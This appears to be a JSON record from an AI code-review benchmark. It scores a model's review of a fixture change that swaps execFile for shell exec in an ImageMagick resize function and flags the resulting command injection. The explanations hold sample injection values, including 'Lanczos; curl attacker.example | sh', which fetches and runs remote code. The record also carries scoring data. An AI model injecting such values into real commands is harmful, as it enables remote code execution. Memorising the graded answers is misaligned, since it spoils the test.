@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "ef19c30e9434",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 64.1,
+  "setup_seconds": 0.1,
+  "total_seconds": 64.2,
+  "usage": {
+    "in": 30906,
+    "cache_read": 58112,
+    "cache_write": 0,
+    "out": 2257,
+    "source": "cli"
+  },
+  "cost_usd": 0.0927876,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Command injection via `child_process.exec`.** `src` and `filter` are interpolated into a shell command string. Because `filter` is unquoted and described as user-composed, a value such as `Lanczos; id` (or a path breakout in `src` like `\" ; id ; echo \"`) executes arbitrary commands as the process user.\n\nShell is unnecessary for ImageMagick `-filter`: pass arguments with `execFile` / `spawn` and `shell: false`, and validate `filter` against an allowlist of known filter names.\n\n```suggestion\nimport { execFile } from \"child_process\";\n\nconst ALLOWED_FILTERS = new Set([\n  \"Lanczos\", \"Mitchell\", \"Catrom\", \"Cubic\", \"Triangle\", \"Point\",\n]);\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  if (!ALLOWED_FILTERS.has(filter)) {\n    return Promise.reject(new Error(`unsupported filter: ${filter}`));\n  }\n  if (!Number.isFinite(w) || w <= 0) {\n    return Promise.reject(new Error(`invalid width: ${w}`));\n  }\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) =>\n      e ? rej(e) : res(\"/tmp/out.png\"),\n    );\n  });\n}\n```"
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 5,
+      "severity": "warning",
+      "body": "The comment claims `-filter` requires a shell for user-composed expressions. That is false for ImageMagick: `-filter` is a normal CLI flag whose value is a single argv token (e.g. `Lanczos`). Keeping a shell here only adds injection surface. Prefer `execFile` plus an allowlist (see the finding on the `exec` call)."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by replacing `execFile` with shell `exec` and interpolating caller-controlled values into the command string.\n\n## Analysis\n\n`resize` previously invoked ImageMagick via `execFile` with an argv array, which does not involve a shell. The new implementation builds:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nBoth `src` and `filter` are strings passed straight into the shell:\n\n- **`filter` is unquoted.** A value like `Lanczos; curl attacker.example | sh` runs arbitrary commands. The PR description and inline comment describe this as a user-composed filter expression, so attacker control is the intended surface.\n- **`src` is only double-quoted.** Values such as `\" /tmp/x.png; id; echo \"` or `` \"$(malicious)\" `` still break out of the quoted region under `/bin/sh`.\n- **`w` is interpolated without validation.** A non-finite or unexpected numeric coercion path is less likely from TypeScript callers, but the shell string remains the wrong boundary.\n\nThe comment that \"`-filter` needs a shell for user-composed filter expressions\" is incorrect. ImageMagick accepts `-filter` (and related options) as ordinary argv tokens. Complex values belong in the argument list via `execFile` / `spawn` with `shell: false`, after validating against an allowlist of known filter names if the product only needs named filters.\n\n## Secondary notes\n\n- The public signature changes from `(src, w)` to `(src, filter, w)`, which is a breaking API change for any external callers. No in-repo callers were found; still worth a deliberate versioning note if this package is published.\n- Output path remains a fixed `/tmp/out.png` (pre-existing race/collision concern; not introduced here).\n\n## Recommendation\n\nKeep `execFile` (or `spawn` with `shell: false`). Pass `src`, `-filter`, a validated `filter`, `-resize`, and `${w}x` as separate argv elements. Reject `filter` values ou",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code uses child_process.exec with unquoted ${filter} and double-quoted ${src} in a shell string; the patch replaced safe execFile argv passing with this pattern and documents filter as user-composed, so command injection is real and critical."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 5,
+      "severity_claimed": "warning",
+      "status": "verified",
+      "reason": "The new comment at resize.ts:4 claims `-filter` needs a shell for user-composed expressions, but the call only interpolates a single filter token into `exec`; ImageMagick `-filter` is a normal argv flag, so the justification is misleading and the switch from `execFile` is unnecessary."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 2,
+    "seconds": 21.623,
+    "verified": 2,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 4990,
+      "out": 738
+    },
+    "cost_usd": 0.015816
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
